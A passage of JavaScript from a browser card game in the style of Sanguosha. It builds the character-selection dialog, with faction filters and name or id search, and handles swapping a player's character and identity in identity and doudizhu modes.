                        groups.push(characterElementGroup);
                    }

                    var natures = ['water', 'soil', 'wood', 'metal'];
                    var span = document.createElement('span');
                    newlined.appendChild(span);
                    span.style.margin = '8px';
                    var clickGroup = function () {
                        if (_status.dragged) return;
                        if (dialog.currentcapt2 == '最近' && dialog.currentcaptnode2 != this && !dialog.currentcaptnode2.inited) {
                            dialog.currentcapt2 = null;
                            dialog.currentcaptnode2.classList.remove('thundertext');
                            dialog.currentcaptnode2.inited = true;
                            dialog.currentcaptnode2 = null;
                        }
                        var currentcapt = dialog.currentcapt2 ? dialog.currentcapt2 : dialog.currentcapt;
                        var node = this, link = this.link;
                        if (node.classList.contains('thundertext')) {
                            dialog.currentgroup = null;
                            dialog.currentgroupnode = null;
                            node.classList.remove('thundertext');
                            for (var i = 0; i < dialog.buttons.length; i++) {
                                if (dialog.currentcapt && dialog.buttons[i].capt != dialog.getCurrentCapt(dialog.buttons[i].link, dialog.buttons[i].capt)) {
                                    dialog.buttons[i].classList.add('nodisplay');
                                } else if (dialog.currentcapt2 && dialog.buttons[i].capt != dialog.getCurrentCapt(dialog.buttons[i].link, dialog.buttons[i].capt, true)) {
                                    dialog.buttons[i].classList.add('nodisplay');
                                } else {
                                    dialog.buttons[i].classList.remove('nodisplay');
                                }
                            }
                        } else {
                            if (dialog.currentgroupnode) {
                                dialog.currentgroupnode.classList.remove('thundertext');
                            }
                            dialog.currentgroup = link;
                            dialog.currentgroupnode = node;
                            node.classList.add('thundertext');
                            for (var i = 0; i < dialog.buttons.length; i++) {
                                if (dialog.currentcapt && dialog.buttons[i].capt != dialog.getCurrentCapt(dialog.buttons[i].link, dialog.buttons[i].capt)) {
                                    dialog.buttons[i].classList.add('nodisplay');
                                } else if (dialog.currentcapt2 && dialog.buttons[i].capt != dialog.getCurrentCapt(dialog.buttons[i].link, dialog.buttons[i].capt, true)) {
                                    dialog.buttons[i].classList.add('nodisplay');
                                } else if (dialog.currentgroup == 'double') {
                                    if (dialog.buttons[i]._changeGroup || dialog.buttons[i].group == 'ye') dialog.buttons[i].classList.remove('nodisplay');
                                    else dialog.buttons[i].classList.add('nodisplay');
                                } else {
                                    if (dialog.buttons[i]._changeGroup || dialog.buttons[i].group == 'ye' || dialog.buttons[i].group != dialog.currentgroup) {
                                        dialog.buttons[i].classList.add('nodisplay');
                                    } else {
                                        dialog.buttons[i].classList.remove('nodisplay');
                                    }
                                }
                            }
                        }
                    };
                    for (var i = 0; i < groups.length; i++) {
                        var span = ui.create.div('.tdnode.pointerdiv.shadowed.reduce_radius.reduce_margin');
                        span.style.margin = '3px';
                        newlined.appendChild(span);
                        span.innerHTML = get.translation(groups[i]);
                        span.link = groups[i];
                        span._nature = natures[i];
                        span.addEventListener(lib.config.touchscreen ? 'touchend' : 'click', clickGroup);
                    }
                    var span = document.createElement('span');
                    newlined.appendChild(span);
                    span.style.margin = '8px';
                    packsource = ui.create.div('.tdnode.pointerdiv.shadowed.reduce_radius.reduce_margin');
                    packsource.style.margin = '3px';
                    newlined.appendChild(packsource);


                    var filternode = null;
                    var clickCaptNode = function (e) {
                        delete _status.filterCharacter;
                        ui.window.classList.remove('shortcutpaused');
                        filternode.delete();
                        filternode.classList.remove('shown');
                        clickCapt.call(this.link, e);
                    };
                    if (get.is.phoneLayout() && lib.config.filternode_button) {
                        newlined.style.marginTop = '';
                        packsource.innerHTML = '筛选';
                        filternode = ui.create.div('.popup-container.filter-character.modenopause');
                        ui.create.div(filternode);
                        filternode.listen(function (e) {
                            if (this.classList.contains('removing')) return;
                            delete _status.filterCharacter;
                            ui.window.classList.remove('shortcutpaused');
                            this.delete();
                            this.classList.remove('shown');
                            e.stopPropagation();
                        });
                        for (var i = 0; i < node.childElementCount; i++) {
                            if (node.childNodes[i].tagName.toLowerCase() == 'span') {
                                node.childNodes[i].style.display = 'none';
                                node.childNodes[i].touchlink = ui.create.div(filternode.firstChild, clickCaptNode, '.menubutton.large.capt', node.childNodes[i].innerHTML);
                                node.childNodes[i].touchlink.link = node.childNodes[i];
                            }
                        }
                        ui.create.node('br', filternode.firstChild);
                    } else {
                        if (onlypack) {
                            packsource.onlypack = true;
                            packsource.innerHTML = get.translation(onlypack + '_character_config');
                            packsource.style.display = 'none';
                            packsource.previousSibling.style.display = 'none';
                        } else {
                            packsource.innerHTML = '武将包';
                        }
                    }

                    newlined2 = document.createElement('div');
                    newlined2.style.marginTop = '5px';
                    newlined2.style.display = 'none';
                    newlined2.style.fontFamily = 'xinwei';
                    newlined2.classList.add('pointernode');
                    if (get.is.phoneLayout()) {
                        newlined2.style.fontSize = '32px';
                    } else {
                        newlined2.style.fontSize = '22px';
                    }
                    newlined2.style.textAlign = 'center';
                    node.appendChild(newlined2);

                    packsource.addEventListener(lib.config.touchscreen ? 'touchend' : 'click', function () {
                        if (packsource.onlypack) return;
                        if (_status.dragged) return;
                        if (get.is.phoneLayout() && lib.config.filternode_button && filternode) {
                            _status.filterCharacter = true;
                            ui.window.classList.add('shortcutpaused');
                            ui.window.appendChild(filternode);
                            ui.refresh(filternode);
                            filternode.classList.add('shown');
                            var dh = filternode.offsetHeight - filternode.firstChild.offsetHeight;
                            if (dh > 0) {
                                filternode.firstChild.style.top = (dh / 2) + 'px';
                            } else {
                                filternode.firstChild.style.top = '';
                            }
                        } else {
                            if (newlined2.style.display == 'none') {
                                newlined2.style.display = 'block';
                            } else {
                                newlined2.style.display = 'none';
                            }
                        }
                    });
                    var packlist = [];
                    for (var i = 0; i < lib.config.all.characters.length; i++) {
                        if (!lib.config.characters.contains(lib.config.all.characters[i])) continue;
                        packlist.push(lib.config.all.characters[i]);
                    }
                    for (var i in lib.characterPack) {
                        if (!lib.config.all.characters.contains(i)) {
                            packlist.push(i);
                        }
                    }
                    for (var i = 0; i < packlist.length; i++) {
                        var span = document.createElement('div');
                        span.style.display = 'inline-block';
                        span.style.width = 'auto';
                        span.style.margin = '5px';
                        if (get.is.phoneLayout()) {
                            span.style.fontSize = '32px';
                        } else {
                            span.style.fontSize = '22px';
                        }
                        span.innerHTML = lib.translate[packlist[i] + '_character_config'];
                        span.link = packlist[i];
                        span.addEventListener(lib.config.touchscreen ? 'touchend' : 'click', clickCapt);
                        newlined2.appendChild(span);
                        if (filternode && !onlypack) {
                            span.touchlink = ui.create.div(filternode.firstChild, clickCaptNode, '.menubutton.large', span.innerHTML);
                            span.touchlink.link = span;
                        }
                    }
                }
                var groupSort;
                if (thisiscard) {
                    groupSort = function (name) {
                        var type = lib.card[name[2]].type;
                        if (lib.cardType[type]) {
                            return lib.cardType[type];
                        }
                        switch (type) {
                            case 'basic':
                                return 0;
                            case 'chess':
                                return 1.5;
                            case 'trick':
                                return 2;
                            case 'delay':
                                return 3;
                            case 'equip':
                                return 4;
                            case 'zhenfa':
                                return 5;
                            default:
                                return 6;
                        }
                    };
                } else {
                    var getGroup = function (name) {
                        var group = get.is.double(name, true);
                        if (group) return group[0];
                        return lib.character[name][1];
                    }
                    groupSort = function (name) {
                        if (!lib.character[name]) return 7;
                        var group = getGroup(name);
                        if (group == 'shen') return -1;
                        if (group == 'wei') return 0;
                        if (group == 'shu') return 1;
                        if (group == 'wu') return 2;
                        if (group == 'qun') return 3;
                        if (group == 'jin') return 4;
                        if (group == 'key') return -999;
                        if (group === 'qingyao_xian') return 9;
                        if (group == 'western') return 6;
                        return 7;
                    }
                }
                list.sort(function (a, b) {
                    var del = groupSort(a) - groupSort(b);
                    if (del != 0) return del;
                    var aa = a, bb = b;
                    if (a.indexOf('_') != -1) {
                        a = a.slice(a.lastIndexOf('_') + 1);
                    }
                    if (b.indexOf('_') != -1) {
                        b = b.slice(b.lastIndexOf('_') + 1);
                    }
                    if (a != b) {
                        return a > b ? 1 : -1;
                    }
                    return aa > bb ? 1 : -1;
                });
                dialog = ui.create.dialog('hidden');
                dialog.classList.add('noupdate');
                dialog.classList.add('scroll1');
                dialog.classList.add('scroll2');
                dialog.classList.add('scroll3');
                dialog.addEventListener(lib.config.touchscreen ? 'touchend' : 'mouseup', function () {
                    _status.clicked2 = true;
                });
                if (heightset) {
                    dialog.style.height = ((game.layout == 'long2' || game.layout == 'nova') ? 380 : 350) + 'px';
                    dialog._scrollset = true;
                }
                dialog.getCurrentCapt = function (link, capt, noalph) {
                    var currentcapt = noalph ? this.currentcapt2 : this.currentcapt;
                    if (this.seperatelist && noalph) {
                        if (this.seperatelist[currentcapt].contains(link)) return capt;
                        return null;
                    }
                    if (lib.characterDialogGroup[currentcapt]) {
                        return lib.characterDialogGroup[currentcapt](link, capt);
                    }
                    if (lib.characterPack[currentcapt]) {
                        if (lib.characterPack[currentcapt][link]) {
                            return capt;
                        }
                        return null;
                    }
                    return this.currentcapt;
                }
                if (str) {
                    dialog.add(str);
                }
                dialog.add(node);
                if (thisiscard) {
                    if (seperate) {
                        seperate = seperate(list);
                        dialog.seperate = [];
                        dialog.seperatelist = seperate.list;
                        if (dialog.seperatelist) {
                            newlined = document.createElement('div');
                            newlined.style.marginTop = '5px';
                            newlined.style.display = 'block';
                            newlined.style.fontFamily = 'xinwei';
                            if (get.is.phoneLayout()) {
                                newlined.style.fontSize = '32px';
                            } else {
                                newlined.style.fontSize = '22px';
                            }
                            newlined.style.textAlign = 'center';
                            node.appendChild(newlined);
                            for (var i in dialog.seperatelist) {
                                var span = document.createElement('span');
                                span.style.margin = '3px';
                                span.innerHTML = i;
                                span.link = i;
                                span.seperate = true;
                                span.addEventListener(lib.config.touchscreen ? 'touchend' : 'click', clickCapt);
                                newlined.appendChild(span);
                            }
                        }
                        for (var i in seperate) {
                            if (i == 'list') continue;
                            var link = '';
                            var linkcontent = seperate[i];
                            if (i.indexOf('_link:') != -1) {
                                link = i.slice(i.indexOf('_link:') + 6);
                                i = i.slice(0, i.indexOf('_link:'));
                            }
                            var nodesep = dialog.add(i);
                            nodesep.link = link;
                            dialog.seperate.push(nodesep);
                            dialog.add([linkcontent, 'vcard'], noclick);
                        }
                    } else {
                        dialog.add([list, 'vcard'], noclick);
                    }
                } else {
                    if (precharacter) {
                        dialog.add([list, 'precharacter'], noclick);
                    } else if (characterx) {
                        dialog.add([list, 'characterx'], noclick);
                    } else {
                        dialog.add([list, 'character'], noclick);

                        var createSearchInput = function (dialog) {
                            var div = ui.create.div(dialog.content, 1, {
                                display: 'block',
                            });
                            var input = ui.create.node('input', div);
                            var select = ui.create.node('select', div);
                            var options = [{
                                text: '武将id',
                                value: 'id',
                                defaultSelected: false,
                            }, {
                                text: '武将名称',
                                value: 'name',
                                defaultSelected: true,
                            }];
                            options.forEach(value => {
                                var option = new Option(value.text, value.value, value.defaultSelected);
                                option.selected = value.defaultSelected;
                                select.appendChild(option);
                            });
                            select.onchange = function () {
                                input.placeholder = this.value === 'id' ? '按武将ID搜索' : '按武将名称搜索';
                                toggleButtons.call(input);
                            }
                            input.placeholder = '按武将名称搜索';
                            var toggleButtons = function () {
                                var mode = select.value;
                                var inputValue = this.value;
                                var buttons = Array.from(dialog.querySelectorAll('.button'))
                                buttons.forEach(value => {
                                    var link = value.link;
                                    var buttonName = link;
                                    if (mode === 'name') buttonName = get.translation(link);
                                    if (this.value === '') return value.classList.remove('nodisplay');
                                    value.classList.toggle('nodisplay', buttonName.indexOf(inputValue) === -1);
                                });
                                return true;
                            }
                            input.onkeydown = function (event) {
                                event && event.stopPropagation();
                                if (event.keyCode === 13) this.oninput(event);
                            };
                            input.oninput = event => toggleButtons.call(input) && event.stopPropagation();
                            dialog.searchInput = input;
                            dialog.select = select;
                        }

                        createSearchInput(dialog);
                    }
                }
                dialog.add(ui.create.div('.placeholder'));
                for (i = 0; i < dialog.buttons.length; i++) {
                    if (thisiscard) {
                        dialog.buttons[i].capt = getCapt(dialog.buttons[i].link[2]);
                    } else {
                        dialog.buttons[i].group = lib.character[dialog.buttons[i].link][1];
                        dialog.buttons[i].capt = getCapt(dialog.buttons[i].link);
                    }
                }
                if (!expandall) {
                    if (!thisiscard && (lib.characterDialogGroup[lib.config.character_dialog_tool] ||
                        lib.config.character_dialog_tool == '自创')) {
                        clickCapt.call(node[lib.config.character_dialog_tool]);
                    }
                }
                return dialog;
            },
        };
        Object.assign(ui.create, createDialog);
        //换将dialog框
        lib.choosePlayer = {
            // 根据模式走不同的方法
            chooseCharacter: function (target) {
                var mode = lib.config.mode;
                if (mode === 'identity' || mode === 'doudizhu') return lib.choosePlayer.chooseCharacterShenFen.call(target);
                else if (mode === 'guozhan') return lib.choosePlayer.chooseCharacterGuoZhan.call(target);
            },
            // 身份模式
            chooseCharacterShenFen: function () {
                /*if (_status.mode == 'purple') {
                    game.chooseCharacterPurple();
                    return;
                }*/
                // 斗地主判断
                /*if (_status.mode == 'online') {
                    game.chooseCharacterZhidou();
                    return;
                }
                if (_status.mode == 'kaihei') {
                    game.chooseCharacterKaihei();
                    return;
                }
                if (_status.mode == 'huanle') {
                    game.chooseCharacterHuanle();
                    return;
                }
                if (_status.mode == 'binglin') {
                    game.chooseCharacterBinglin();
                    return;
                }*/
                var next = game.createEvent('chooseCharacter', false);
                next.target = this;
                next.player = game.me;
                next.filter = function (name) {
                    if (lib.character[name][1] === 'key' || name.indexOf("key") === 0) return false;
                    return true;
                };
                next.showConfig = true;
                next.addPlayer = function (player) {
                    var list = lib.config.mode_config.identity.identity[game.players.length - 3].slice(0);
                    var list2 = lib.config.mode_config.identity.identity[game.players.length - 2].slice(0);
                    for (var i = 0; i < list.length; i++) list2.remove(list[i]);
                    player.identity = list2[0];
                    player.setIdentity('cai');
                };
                next.removePlayer = function () {
                    return game.players.randomGet(target, game.zhu);
                };
                next.setContent(function () {
                    "step 0"
                    ui.arena.classList.add('choose-character');
                    var i;
                    var list;
                    var list2 = [];
                    var list3 = [];
                    var list4 = [];
                    var identityList;
                    var chosen = lib.config.continue_name || [];
                    game.saveConfig('continue_name');
                    event.chosen = chosen;
                    if (_status.mode === 'zhong') {
                        event.zhongmode = true;
                        identityList = ['zhu', 'zhong', 'mingzhong', 'nei', 'fan', 'fan', 'fan', 'fan'];
                    } else {
                        identityList = lib.config.mode_config.identity.identity[game.players.length - 2].slice(0);
                        if (get.config('double_nei')) {
                            switch (get.playerNumber()) {
                                case 8:
                                    identityList.remove('fan');
                                    identityList.push('nei');
                                    break;
                                case 7:
                                    identityList.remove('zhong');
                                    identityList.push('nei');
                                    break;
                                case 6:
                                    identityList.remove('fan');
                                    identityList.push('nei');
                                    break;
                                case 5:
                                    identityList.remove('fan');
                                    identityList.push('nei');
                                    break;
                                case 4:
                                    identityList.remove('zhong');
                                    identityList.push('nei');
                                    break;
                                case 3:
                                    identityList.remove('fan');
                                    identityList.push('nei');
                                    break;
                            }
                        }
                    }
                    var addSetting = function (dialog) {
                        dialog.add('选择身份').classList.add('add-setting');
                        var table = document.createElement('div');
                        table.classList.add('add-setting');
                        table.style.margin = '0';
                        table.style.width = '100%';
                        table.style.position = 'relative';
                        var listi;
                        if (event.zhongmode) {
                            listi = ['random', 'zhu', 'mingzhong', 'zhong', 'nei', 'fan'];
                        } else {
                            listi = ['random', 'zhu', 'zhong', 'nei', 'fan'];
                        }
                        for (var i = 0; i < listi.length; i++) {
                            var td = ui.create.div('.shadowed.reduce_radius.pointerdiv.tdnode');
                            td.link = listi[i];
                            if (td.link === target.identity) {
                                td.classList.add('bluebg');
                            }
                            table.appendChild(td);
                            td.innerHTML = '<span>' + get.translation(listi[i] + '2') + '</span>';
                            td.addEventListener(lib.config.touchscreen ? 'touchend' : 'click', function () {
                                if (_status.dragged) return;
                                if (_status.justdragged) return;
                                _status.tempNoButton = true;
                                setTimeout(function () {
                                    _status.tempNoButton = false;
                                }, 500);
                                var link = this.link;
                                if (game.zhu.name) {
                                    if (link != 'random') {
                                        _status.event.parent.fixedseat = get.distance(target, game.zhu, 'absolute');
                                    }
                                    game.zhu.uninit();
                                    delete game.zhu.isZhu;
                                    delete game.zhu.identityShown;
                                }
                                var current = this.parentNode.querySelector('.bluebg');
                                if (current) {
                                    current.classList.remove('bluebg');
                                }
                                current = seats.querySelector('.bluebg');
                                if (current) {
                                    current.classList.remove('bluebg');
                                }
                                if (link == 'random') {
                                    if (event.zhongmode) {
                                        link = ['zhu', 'zhong', 'nei', 'fan', 'mingzhong'].randomGet();
                                    } else {
                                        link = ['zhu', 'zhong', 'nei', 'fan'].randomGet();
                                    }
                                    for (var i = 0; i < this.parentNode.childElementCount; i++) {
                                        if (this.parentNode.childNodes[i].link == link) {
                                            this.parentNode.childNodes[i].classList.add('bluebg');
                                        }
                                    }
                                } else {
                                    this.classList.add('bluebg');
                                }
                                num = get.config('choice_' + link);
                                if (event.zhongmode) {
                                    num = 6;
                                    if (link == 'zhu' || link == 'nei' || link == 'mingzhong') {
                                        num = 8;
                                    }
                                }
                                _status.event.parent.swapnodialog = function (dialog, list) {
                                    var buttons = ui.create.div('.buttons');
                                    var node = dialog.buttons[0].parentNode;
                                    dialog.buttons = ui.create.buttons(list, 'characterx', buttons);
                                    dialog.content.insertBefore(buttons, node);
                                    buttons.animate('start');
                                    node.remove();
                                    game.uncheck();
                                    game.check();
                                    for (var i = 0; i < seats.childElementCount; i++) {
                                        if (get.distance(game.zhu, target, 'absolute') === seats.childNodes[i].link) {
                                            seats.childNodes[i].classList.add('bluebg');
                                        }
                                    }
                                }
                                _status.event = _status.event.parent;
                                _status.event.step = 0;
                                _status.event.identity = link;
                                if (link != (event.zhongmode ? 'mingzhong' : 'zhu')) {
                                    seats.previousSibling.style.display = '';
                                    seats.style.display = '';
                                } else {
                                    seats.previousSibling.style.display = 'none';
                                    seats.style.display = 'none';
                                }
                                game.resume();
                            });
                        }
                        dialog.content.appendChild(table);
                        dialog.add('选择座位').classList.add('add-setting');
                        var seats = document.createElement('div');
                        seats.classList.add('add-setting');
                        seats.style.margin = '0';
                        seats.style.width = '100%';
                        seats.style.position = 'relative';
                        for (var i = 2; i <= game.players.length; i++) {
                            var td = ui.create.div('.shadowed.reduce_radius.pointerdiv.tdnode');
                            td.innerHTML = get.cnNumber(i, true);
                            td.link = i - 1;
                            seats.appendChild(td);
                            if (get.distance(game.zhu, target, 'absolute') === i - 1) {
                                td.classList.add('bluebg');
                            }
                            td.addEventListener(lib.config.touchscreen ? 'touchend' : 'click', function () {
                                if (_status.dragged) return;
                                if (_status.justdragged) return;
                                if (get.distance(game.zhu, target, 'absolute') == this.link) return;
                                var current = this.parentNode.querySelector('.bluebg');
                                if (current) {
                                    current.classList.remove('bluebg');
                                }
                                this.classList.add('bluebg');
                                for (var i = 0; i < game.players.length; i++) {
                                    if (get.distance(game.players[i], target, 'absolute') == this.link) {
                                        game.swapSeat(game.zhu, game.players[i], false);
                                        return;
                                    }
                                }
                            });
                        }
                        dialog.content.appendChild(seats);
                        if (target == game.zhu) {
                            seats.previousSibling.style.display = 'none';
                            seats.style.display = 'none';
                        }

                        dialog.add(ui.create.div('.placeholder.add-setting'));
                        dialog.add(ui.create.div('.placeholder.add-setting'));
                        if (get.is.phoneLayout()) dialog.add(ui.create.div('.placeholder.add-setting'));
                    };
                    var removeSetting = function () {
                        var dialog = _status.event.dialog;
                        if (dialog) {
                            dialog.style.height = '';
                            delete dialog._scrollset;
                            var list = Array.from(dialog.querySelectorAll('.add-setting'));
                            while (list.length) {
                                list.shift().remove();
                            }
                            ui.update();
                        }
                    };
                    event.list = [];
                    identityList.randomSort();
                    if (event.identity) {
                        identityList.remove(event.identity);
                        identityList.unshift(event.identity);
                        if (event.fixedseat) {
                            var zhuIdentity = (_status.mode == 'zhong') ? 'mingzhong' : 'zhu';
                            if (zhuIdentity != event.identity) {
                                identityList.remove(zhuIdentity);
                                identityList.splice(event.fixedseat, 0, zhuIdentity);
                            }
                            delete event.fixedseat;
                        }
                        delete event.identity;
                    } else if (_status.mode != 'zhong' && (!_status.brawl || !_status.brawl.identityShown)) {
                        var ban_identity = [];
                        ban_identity.push(get.config('ban_identity') || 'off');
                        if (ban_identity[0] != 'off') {
                            ban_identity.push(get.config('ban_identity2') || 'off');
                            if (ban_identity[1] != 'off') {
                                ban_identity.push(get.config('ban_identity3') || 'off');
                            }
                        }
                        ban_identity.remove('off');
                        if (ban_identity.length) {
                            var identityList2 = identityList.slice(0);
                            for (var i = 0; i < ban_identity.length; i++) {
                                while (identityList2.remove(ban_identity[i]));
                            }
                            ban_identity = identityList2.randomGet();
                            identityList.remove(ban_identity);
                            identityList.splice(game.players.indexOf(target), 0, ban_identity);
                        }
                    }
                    if (get.config('special_identity') && !event.zhongmode && game.players.length == 8) {
                        for (var i = 0; i < game.players.length; i++) {
                            delete game.players[i].special_identity;
                        }
                        event.special_identity = [];
                        var zhongs = game.filterPlayer(function (current) {
                            return current.identity == 'zhong';
                        });
                        var fans = game.filterPlayer(function (current) {
                            return current.identity == 'fan';
                        });
                        if (fans.length >= 1) {
                            fans.randomRemove().special_identity = 'identity_zeishou';
                            event.special_identity.push('identity_zeishou');
                        }
                        if (zhongs.length > 1) {
                            zhongs.randomRemove().special_identity = 'identity_dajiang';
                            zhongs.randomRemove().special_identity = 'identity_junshi';
                            event.special_identity.push('identity_dajiang');
                            event.special_identity.push('identity_junshi');
                        } else if (zhongs.length == 1) {
                            if (Math.random() < 0.5) {
                                zhongs.randomRemove().special_identity = 'identity_dajiang';
                                event.special_identity.push('identity_dajiang');
                            } else {
                                zhongs.randomRemove().special_identity = 'identity_junshi';
                                event.special_identity.push('identity_junshi');
                            }
                        }
                    }
                    if (!game.zhu) game.zhu = target;
                    else {
                        game.zhu.setIdentity();
                        game.zhu.identityShown = true;
                        game.zhu.isZhu = (game.zhu.identity == 'zhu');
                        game.zhu.node.identity.classList.remove('guessing');
                        /*target.setIdentity();
                        target.node.identity.classList.remove('guessing');*/
                    }
                    //选将框分配
                    for (i in lib.characterReplace) {
                        var ix = lib.characterReplace[i];
                        for (var j = 0; j < ix.length; j++) {
                            if (chosen.contains(ix[j]) || lib.filter.characterDisabled(ix[j])) ix.splice(j--, 1);
                        }
                        if (ix.length) {
                            event.list.push(i);
                            list4.addArray(ix);
                            var bool = false;
                            for (var j of ix) {
                                if (lib.character[j][4] && lib.character[j][4].contains('zhu')) {
                                    bool = true;
                                    break;
                                }
                            }
                            (bool ? list2 : list3).push(i);
                        }
                    }
                    for (i in lib.character) {
                        if (list4.contains(i)) continue;
                        if (chosen.contains(i)) continue;
                        if (lib.filter.characterDisabled(i)) continue;

                        if (typeof event.filter === 'function' && event.filter(i) === false) continue;

                        event.list.push(i);
                        list4.push(i);
                        if (lib.character[i][4] && lib.character[i][4].contains('zhu')) {
                            list2.push(i);
                        } else {
                            list3.push(i);
                        }
                    }
                    list2.sort(lib.sort.character);
                    event.list.randomSort();
                    _status.characterlist = list4.slice(0).randomSort();
                    list3.randomSort();
                    if (_status.brawl && _status.brawl.chooseCharacterFilter) {
                        _status.brawl.chooseCharacterFilter(event.list, list2, list3);
                    }
                    var num = get.config('choice_' + target.identity);
                    if (event.zhongmode) {
                        num = 6;
                        if (target.identity == 'zhu' || target.identity == 'nei' || target.identity == 'mingzhong') {
                            num = 8;
                        }
                    }
                    if (target === game.zhu && lib.config.mode !== "doudizhu") {
                        list = list2.concat(list3.slice(0, num));
                    } else {
                        list = list3.slice(0, 8);
                    }
                    // }
                    delete event.swapnochoose;
                    var dialog;
                    if (event.swapnodialog) {
                        dialog = ui.dialog;
                        event.swapnodialog(dialog, list);
                        delete event.swapnodialog;
                    } else {
                        var str = '选择角色';
                        if (_status.brawl && _status.brawl.chooseCharacterStr) {
                            str = _status.brawl.chooseCharacterStr;
                        }
                        dialog = ui.create.dialog(str, 'hidden', [list, 'characterx']);
                        /*if(!_status.brawl||!_status.brawl.noAddSetting){
                            if(get.config('change_identity')){
                                addSetting(dialog);
                            }
                        }*/
                    }

                    var createSearchInput = function (dialog) {
                        var div = ui.create.div(dialog.content, 1, {
                            display: 'block',
                        });
                        var input = ui.create.node('input', div);
                        var select = ui.create.node('select', div);
                        var options = [{
                            text: '武将id',
                            value: 'id',
                            defaultSelected: false,
                        }, {
                            text: '武将名称',
                            value: 'name',
                            defaultSelected: true,
                        }];
                        options.forEach(value => {
                            var option = new Option(value.text, value.value, value.defaultSelected);
                            option.selected = value.defaultSelected;
                            select.appendChild(option);
                        });
                        select.onchange = function () {
                            input.placeholder = this.value === 'id' ? '按武将ID搜索' : '按武将名称搜索';
                        }
                        input.placeholder = '按武将名称搜索';
                        var toggleButtons = function () {
                            var mode = select.value;
                            var inputValue = this.value;
                            var buttons = Array.from(dialog.querySelectorAll('.button'))
                            buttons.forEach(value => {
                                var link = value.link;
                                var buttonName = link;
                                if (mode === 'name') buttonName = get.translation(link);
                                if (this.value === '') return value.classList.remove('nodisplay');
                                value.classList.toggle('nodisplay', buttonName.indexOf(inputValue) === -1);
                            });
                            return true;
                        }
                        input.onkeydown = function (event) {
                            event && event.stopPropagation();
                            if (event.keyCode === 13) this.oninput(event);
                        };
                        input.oninput = event => toggleButtons.call(input) && event.stopPropagation();
                        dialog.searchInput = input;
                        dialog.select = select;
                    }

                    createSearchInput(dialog);

                    dialog.searchInput.disabled = true;
                    dialog.searchInput.placeholder = '点击【自由选将】搜索';
                    dialog.select.disabled = true;

                    if (target.special_identity) {
                        dialog.setCaption('选择角色（' + get.translation(target.special_identity) + '）');
                        target.node.identity.firstChild.innerHTML = get.translation(target.special_identity + '_bg');
                    } else {
                        dialog.setCaption('选择角色');
                        //target.setIdentity();
                    }
                    if (lib.onfree) {
                        lib.onfree.push(function () {
                            event.dialogxx = ui.create.characterDialog('heightset', target);
                        });
                    } else {
                        event.dialogxx = ui.create.characterDialog('heightset', target);
                    }

                    // createSearchInput(event.dialogxx);
                    /*自动改为全部*/
                    /*if (event.dialogxx.currentcaptnode2) {
                        if (lib.config.touchscreen) {
                            event.dialogxx.currentcaptnode2.dispatchEvent(new DragEvent('touchend', {
                                cancelable: true,
                                composed: true
                            }))
                        } else {
                            event.dialogxx.currentcaptnode2.click();
                        }
                    }*/
                    /*补充所有武将*/
                    var charactersKey = Object.keys(lib.character).removeArray(event.dialogxx.buttons.map(value => value.link)).filter(value => {
                        var character = lib.character[value];
                        if (!character || !character[4]) return false;
                        return !character[4].contains('unseen')
                    });
                    if (!event.chosen.length) {
                        game.me.chooseButton(event.dialogxx, true).set('onfree', true).selectButton = function () {
                            if ((_status.brawl && _status.brawl.doubleCharacter) || (target == game.zhu && _status.mode == 'online')) return 2;
                            return get.config('double_character') ? 2 : 1
                        };
                    } else {
                        lib.init.onfree();
                    }

                    var buttons1 = ui.create.buttons(charactersKey, 'character', event.dialogxx.querySelector(".buttons"));
                    event.dialogxx.buttons = event.dialogxx.buttons.concat(buttons1);
                    const getCapt = function (str) {
                        var capt;
                        if (str.indexOf('_') == -1) {
                            capt = str[0];
                        } else {
                            capt = str[str.lastIndexOf('_') + 1];
                        }
                        capt = capt.toLowerCase();
                        if (!/[a-z]/i.test(capt)) {
                            capt = '自定义';
                        }
                        return capt;
                    }
                    buttons1.forEach(item => {
                        item.group = lib.character[item.link][1];
                        item.capt = getCapt(item.link);
                        item.classList.add('nodisplay')
                    })
                    // event.dialogxx.add([charactersKey, 'character']);


                    event.reai = lib.qyDeepClone(target.ai);
                    "step 1"
                    if (_status.mode == 'online') event.cardPile = target.storage.doudizhu_cardPile;
                    if (ui.cheat) {
                        ui.cheat.close();
                        delete ui.cheat;
                    }
                    if (ui.cheat2) {
                        ui.cheat2.close();
                        delete ui.cheat2;
                    }
                    var chooseGroup = false;
                    if (event.chosen.length) {
                        if (lib.character[event.chosen[0]][1] == 'shen' && !lib.character[event.chosen[0]][4].contains('hiddenSkill')) {
                            chooseGroup = true;
                        }
                    } else if (event.modchosen) {
                        if (event.modchosen[0] == 'random') event.modchosen[0] = result.buttons[0].link;
                        else event.modchosen[1] = result.buttons[0].link;
                    } else if (result.buttons.length == 2) {
                        event.choosed = [result.buttons[0].link, result.buttons[1].link];
                        game.addRecentCharacter(result.buttons[0].link, result.buttons[1].link);
                        if (lib.character[event.choosed[0]][1] == 'shen' && !lib.character[event.choosed[0]][4].contains('hiddenSkill')) {
                            chooseGroup = true;
                        }
                    } else {
                        event.choosed = [result.buttons[0].link];
                        if (lib.character[event.choosed[0]][1] == 'shen' && !lib.character[event.choosed[0]][4].contains('hiddenSkill')) {
                            chooseGroup = true;
                        }
                        game.addRecentCharacter(result.buttons[0].link);
                    }
                    if (get.config('choose_group') && chooseGroup) {
                        var list = lib.group.slice(0);
                        list.remove('shen');
                        game.me.chooseControl(list).prompt = '请选择神武将的势力';
                    }
                    "step 2"
                    event.group = result.control || false;
                    if (event.chosen.length) {
                        lib.element.player.uninit.call(target);
                        lib.element.player.init.call(target, event.chosen[0], event.chosen[1]);
                    } else if (event.modchosen) {
                        lib.element.player.uninit.call(target);
                        lib.element.player.init.call(target, event.modchosen[0], event.modchosen[1]);
                    } else if (event.choosed.length == 2) {
                        lib.element.player.uninit.call(target);
                        lib.element.player.init.call(target, event.choosed[0], event.choosed[1]);
                    } else {
                        lib.element.player.uninit.call(target);
                        lib.element.player.init.call(target, event.choosed[0]);
                    }
                    event.list.remove(get.sourceCharacter(target.name1));
                    event.list.remove(get.sourceCharacter(target.name2));
                    if (target == game.zhu && _status.mode != 'purple') {
                        if (game.players.length > 4 || get.mode() == 'doudizhu') {
                            target.hp++;
                            target.maxHp++;
                            target.update();
                        }
                        if (get.mode() == 'identity') {
                            var enhance_zhu = false;
                            if (_status.connectMode) {
                                enhance_zhu = (_status.mode != 'zhong' && _status.mode != 'purple' && lib.configOL.enhance_zhu && get.population('fan') >= 3);
                            } else {
                                enhance_zhu = (_status.mode != 'zhong' && _status.mode != 'purple' && get.config('enhance_zhu') && get.population('fan') >= 3);
                            }
                            if (enhance_zhu) {
                                var skill;
